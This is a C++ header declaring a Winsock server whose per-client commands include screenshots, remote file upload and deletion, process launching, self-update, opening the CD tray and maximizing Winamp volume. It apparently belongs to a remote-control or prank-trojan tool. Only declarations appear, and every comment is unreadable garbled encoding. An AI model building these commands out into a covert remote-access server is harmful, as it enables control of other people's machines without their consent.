#pragma once

#include <winsock2.h>
#include <list>

namespace PUSHKIN_SERVER
{
   // �����-������ (���������� � ��������) - ������� ����� ��������� � ������� ���� vector
   class CPushkinServer;
   class CPushkinServClient
   {
      // ��������, �������������� ��������
      int Authorize();                    // ���������� ������������
      int SendFile();                     // ������� �����
      int SendVersion();                  // ������� ������ ������ �������
      int UpdateServer();                 // ���������� �������, �������������� ��������
      int UpdateServerImpl();             // �������� � ������ ��������� ���������� �������
      int GetFileList();                  // ��������� ������ ������ � ��������� �� ������� ����
      int SendDrivesList();               // ��������� ������ ���������� ������
      int ShowMessage();                  // ����� ��������� �� ������
      int GetProcessList();               // ��������� ������ ��������� � �������
      int OpenCDDoor();                   // �������� ������ CD-ROM'a
      int GetScreenShot();                // ��������� ��������� � ������ ������
      int UploadFile();                   // �������� ����� �� ������
      int ServCreateProcess();            // ������ ��������� �� ����������
      int ServShellExecute();             // ������ ������-���� �����, ��������, �������� ��� MP3
      int MaximizeWinampVolume();         // ������� ���� ������������ �� Winamp'e
      int GetFilesTree();                 // �������� ������ ������ � ���������
      int SendFilesList();                // ��������� ������ �� ����������� ������
      int SendFreeSpace();                // ��������� ������ ���������� �����
      int DirectFileUpload();             // ������ �������� ������ � �������� ���� ��� � ������� ����� �� ������� - ���������� �������
      int DeleteFile();                   // �������� ����� �� �������
      int GetFileEx();                    // ��������� ����� � ��������
   public:
      CPushkinServer *server_p;       // ��������� �� ��������
      SOCKET          m_socket;       // ����� �������
      sockaddr_in     m_client_addr;  // ���������� � �������
      bool            m_bAuthorized;  // ������� ����, ��� ������ �����������

      CPushkinServClient();
      CPushkinServClient(const CPushkinServClient &cl_in);
      CPushkinServClient &operator=(const CPushkinServClient cl_in);
      ~CPushkinServClient();

      // ������ � ��������
      int SendGreeting();                 // ����� ����������� �������
      int GetCommand(UINT &command);      // ������� ������� �� ������� (���������)

      // ��������� ������� � �������
      int ProcessCommand(UINT command);
   };

   // �������� ������-������� - ������������� ������
   // (���� ���������� � �������� ��������� ��� ���� ���� �����)
   class CPushkinServer
   {
      WSADATA      m_wsa_data;       // ���������� � �������
      bool         m_bWinsockInited; // ������� ����, ��� ����� WSAStartup ��� ���

      void InitStructures();

   public:
      SOCKET       m_socket;         // ��������� �����
      bool         m_bStopServer;    // ������� ����, ��� ������ ����� ����������

      CPushkinServer();              // ����������� �� ���������
      ~CPushkinServer();             // ����������

      int Init(int port_num);        // ������������� �������
      int Run();                     // ������ ������� (��������� �������� �� ������� ����)
   };
}
